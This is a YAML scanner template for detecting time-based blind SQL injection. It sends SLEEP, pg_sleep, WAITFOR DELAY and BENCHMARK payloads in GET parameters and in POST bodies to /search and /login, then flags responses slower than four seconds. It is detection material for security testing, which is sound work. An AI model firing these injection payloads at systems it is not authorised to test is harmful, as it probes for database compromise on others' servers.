id: timing-attack-sqli
name: "Blind SQL Injection (Time-Based)"
author:
  name: "CERT-X-GEN Security Team"
  email: "security@cert-x-gen.io"
severity: high
description: |
  Detects blind SQL injection vulnerabilities using time-based techniques.
  Injects sleep/delay functions and measures response time differences.

tags:
  - sql-injection
  - blind-sqli
  - timing-attack
  - database

language: yaml
confidence: 80

# HTTP request specifications
http:
  - method: GET
    path:
      - "/?id=1' AND SLEEP(5)--"
      - "/?id=1' AND pg_sleep(5)--"
      - "/?id=1' AND WAITFOR DELAY '0:0:5'--"
      - "/?id=1' AND BENCHMARK(5000000,MD5('test'))--"
    
    headers:
      User-Agent: "cert-x-gen/1.0"
    
    # Match response time > 4 seconds (accounting for network latency)
    matchers-condition: and
    matchers:
      - type: time
        condition: greater
        time: 4s
      
      - type: status
        status: [200, 500]

  - method: POST
    path:
      - "/search"
      - "/login"
    
    body: "query=test' AND SLEEP(5)--"
    
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    
    matchers:
      - type: time
        condition: greater
        time: 4s
